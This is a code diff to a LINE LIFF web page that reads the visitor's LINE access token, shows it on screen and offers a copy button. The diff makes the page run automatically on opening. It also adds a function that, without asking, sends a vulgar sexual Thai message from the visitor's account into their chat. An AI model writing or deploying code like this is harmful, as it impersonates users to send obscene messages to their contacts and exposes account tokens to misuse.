@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LIFF Token</title>
+    <title>LIFF Token & Auto Message</title>
     <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
@@ -12,20 +12,35 @@
     </style>
 </head>
 <body>
-    <h2>LIFF Token</h2>
+    <h2>LIFF Token & Auto Message</h2>
     <button onclick="getToken()">ดึง Token</button>
-    <p id="token">กดปุ่มเพื่อดึง Token</p>
+    <p id="token">กำลังโหลด...</p>
     <button onclick="copyToken()">คัดลอก Token</button>
 
     <script>
+        function sendMessage() {
+            liff.sendMessages([
+                {
+                    type: "text",
+                    text: "อยากเลียหี🤤"
+                }
+            ]).then(() => {
+                console.log("ส่งข้อความสำเร็จ");
+            }).catch(err => {
+                console.error("เกิดข้อผิดพลาด:", err);
+            });
+        }
+
         function getToken() {
             liff.init({ liffId: "2007005525-yVvAO6zg" }).then(() => {
                 if (!liff.isLoggedIn()) {
                     liff.login();
                 } else {
-                    liff.getAccessToken() ? 
-                        document.getElementById("token").innerText = liff.getAccessToken() :
-                        document.getElementById("token").innerText = "ไม่พบ Token";
+                    const token = liff.getAccessToken();
+                    document.getElementById("token").innerText = token ? token : "ไม่พบ Token";
+
+                    // ส่งข้อความอัตโนมัติ
+                    sendMessage();
                 }
             }).catch(err => console.error("LIFF Error:", err));
         }
@@ -36,6 +51,9 @@
                 alert("คัดลอก Token สำเร็จ!");
             }).catch(err => console.error("Copy Failed:", err));
         }
+
+        // เรียก getToken() ทันทีเมื่อเปิด LIFF
+        getToken();
     </script>
 </body>
 </html>
